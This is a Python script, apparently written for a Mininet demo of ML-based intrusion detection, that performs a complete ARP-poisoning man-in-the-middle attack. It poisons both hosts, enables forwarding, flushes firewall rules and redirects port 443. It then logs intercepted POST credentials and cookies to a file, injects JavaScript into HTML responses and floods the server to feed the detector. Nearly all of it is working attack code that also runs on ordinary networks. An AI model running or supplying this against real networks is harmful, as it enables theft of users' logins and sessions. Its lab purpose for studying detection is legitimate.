# -*- coding: utf-8 -*-
"""
attacker_mitm.py — Realistic MITM attack for Mininet demo

Usage (from Mininet CLI):
    attacker python3 /tmp/attacker_mitm.py 10.0.0.1 10.0.0.2

Usage (from xterm on attacker host):
    python3 /tmp/attacker_mitm.py 10.0.0.1 10.0.0.2

Usage (explicit interface):
    python3 /tmp/attacker_mitm.py 10.0.0.1 10.0.0.2 attacker-eth0
"""

import os, time, sys, threading, re
from scapy.all import *

# ── Config ──────────────────────────────────────────────
VICTIM_IP = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
SERVER_IP = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.2"
IFACE     = sys.argv[3] if len(sys.argv) > 3 else None
STOLEN    = "/tmp/mitm_stolen.txt"

# ── Auto-detect interface ───────────────────────────────
def find_interface():
    """
    Pick the right interface automatically.
    Works whether launched from xterm (inside host namespace)
    or from Mininet CLI (root namespace).
    Priority: any non-loopback iface that has 10.0.0.x address.
    """
    all_ifaces = get_if_list()

    # 1. Explicit arg wins
    if IFACE and IFACE in all_ifaces:
        return IFACE

    # 2. Find iface that actually holds a 10.0.0.x IP
    for iface in all_ifaces:
        try:
            ip = get_if_addr(iface)
            if ip.startswith('10.0.0.'):
                print(f"[*] Auto-selected interface '{iface}' (has IP {ip})")
                return iface
        except Exception:
            continue

    # 3. Known Mininet naming patterns
    for candidate in ['attacker-eth0', 'eth0', 'ens3', 'enp0s3']:
        if candidate in all_ifaces:
            print(f"[*] Using candidate interface '{candidate}'")
            return candidate

    # 4. Scapy default
    fallback = str(conf.iface)
    print(f"[*] Falling back to scapy default: '{fallback}'")
    return fallback

IFACE = find_interface()

print(f"[*] MITM Config:")
print(f"    Victim IP  : {VICTIM_IP}")
print(f"    Server IP  : {SERVER_IP}")
print(f"    Interface  : {IFACE}")
print(f"    My IP      : {get_if_addr(IFACE)}")
print(f"    My MAC     : {get_if_hwaddr(IFACE)}")

# ── IP forwarding + iptables ────────────────────────────
os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
os.system("sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null 2>&1")
os.system("iptables -F 2>/dev/null; iptables -t nat -F 2>/dev/null")
os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 "
          "-j REDIRECT --to-ports 10000 2>/dev/null")

# ── MAC resolution ──────────────────────────────────────
def get_mac(ip, retries=6):
    """Resolve MAC via ARP, then OS cache, then static fallback."""
    for attempt in range(retries):
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=IFACE, timeout=3, verbose=False
            )
            if ans:
                mac = ans[0][1].hwsrc
                print(f"[+] ARP resolved: {ip} → {mac}")
                return mac
        except Exception as e:
            print(f"[!] ARP attempt {attempt+1}/{retries} for {ip}: {e}")
        time.sleep(1)

    # OS ARP cache
    cache = os.popen(f"arp -n {ip}").read()
    m = re.search(r'([\da-f]{2}:){5}[\da-f]{2}', cache, re.I)
    if m:
        print(f"[+] Found in OS ARP cache: {ip} → {m.group(0)}")
        return m.group(0)

    # Static fallback — Mininet topology uses deterministic MACs
    static = {
        '10.0.0.1':   '00:00:00:00:00:01',  # victim
        '10.0.0.2':   '00:00:00:00:00:02',  # server
        '10.0.0.11':  '00:00:00:00:00:11',  # device1
        '10.0.0.12':  '00:00:00:00:00:12',  # device2
    }
    if ip in static:
        print(f"[!] Using static MAC fallback: {ip} → {static[ip]}")
        return static[ip]

    print(f"[!] FAILED to resolve MAC for {ip}")
    return None

# ── ARP poison loop ─────────────────────────────────────
def arp_poison_loop(target_ip, spoof_ip):
    """
    Tell target_ip that spoof_ip is at OUR MAC.
    → Redirects target's traffic for spoof_ip through us.
    """
    target_mac = get_mac(target_ip)
    my_mac     = get_if_hwaddr(IFACE)
    if not target_mac:
        print(f"[!] Cannot poison {target_ip} — MAC unknown")
        return

    print(f"[+] Poisoning {target_ip}  (telling it: {spoof_ip} = {my_mac})")
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,  hwdst=target_mac,
        psrc=spoof_ip,   hwsrc=my_mac
    )
    count = 0
    while True:
        sendp(pkt, iface=IFACE, verbose=False)
        count += 1
        if count % 20 == 0:
            print(f"[~] ARP poison ×{count}  →  {target_ip}  (claiming {spoof_ip})")
        time.sleep(0.5)

# ── Packet interception ─────────────────────────────────
def relay_and_intercept(pkt):
    if IP not in pkt:
        return
    src, dst = pkt[IP].src, pkt[IP].dst
    if src not in (VICTIM_IP, SERVER_IP) and dst not in (VICTIM_IP, SERVER_IP):
        return
    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return

    try:
        payload = pkt[Raw].load.decode('utf-8', errors='ignore')
    except Exception:
        return

    # Steal POST credentials
    if 'POST' in payload and ('username' in payload or 'password' in payload):
        ts = time.strftime('%H:%M:%S')
        data = (f"[{ts}] CREDENTIALS STOLEN!\n"
                f"  From: {src}  →  To: {dst}\n"
                f"  {payload[:300]}\n")
        print("\n" + "🎯"*15)
        print(data)
        print("🎯"*15 + "\n")
        open(STOLEN, 'a').write(data)

    # Steal cookies
    if 'Cookie:' in payload:
        cookies = re.findall(r'Cookie: (.+)', payload)
        if cookies:
            ts = time.strftime('%H:%M:%S')
            line = f"[{ts}] COOKIE: {cookies[0][:200]}\n"
            print(f"🍪 {line.strip()}")
            open(STOLEN, 'a').write(line)

    # Inject JS into HTTP responses
    if 'HTTP/1' in payload and 'text/html' in payload and '</body>' in payload:
        modified = payload.replace(
            '</body>',
            '<script>document.title="HACKED by MITM"</script></body>'
        )
        if modified != payload:
            pkt[Raw].load = modified.encode('utf-8', errors='ignore')
            del pkt[IP].chksum, pkt[IP].len, pkt[TCP].chksum
            sendp(pkt, iface=IFACE, verbose=False)

# ── Bulk traffic for ML detection ───────────────────────
def generate_bulk_traffic():
    """Flood flows so the ML model accumulates enough packets to score."""
    import socket
    while True:
        try:
            for _ in range(30):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                try:
                    s.connect((SERVER_IP, 8080))
                    s.send(b"GET / HTTP/1.1\r\nHost: 10.0.0.2\r\nConnection: close\r\n\r\n")
                    s.recv(1024)
                finally:
                    s.close()
            time.sleep(0.1)
        except Exception:
            time.sleep(1)

# ── Launch ──────────────────────────────────────────────
print("\n" + "="*50)
print("🔴 MITM ATTACK STARTING")
print("="*50)

threading.Thread(target=arp_poison_loop, args=(VICTIM_IP, SERVER_IP), daemon=True).start()
threading.Thread(target=arp_poison_loop, args=(SERVER_IP, VICTIM_IP), daemon=True).start()
time.sleep(3)  # Let ARP poison propagate before bulk traffic starts
threading.Thread(target=generate_bulk_traffic, daemon=True).start()

print("✅ ARP Poisoning : active")
print("✅ IP Forwarding : active")
print("✅ Bulk traffic  : active  (ML detection in ~5s)")
print(f"✅ Logging to    : {STOLEN}")

sniff(
    filter=f"ip host {VICTIM_IP} or ip host {SERVER_IP}",
    prn=relay_and_intercept,
    iface=IFACE,
    store=False
)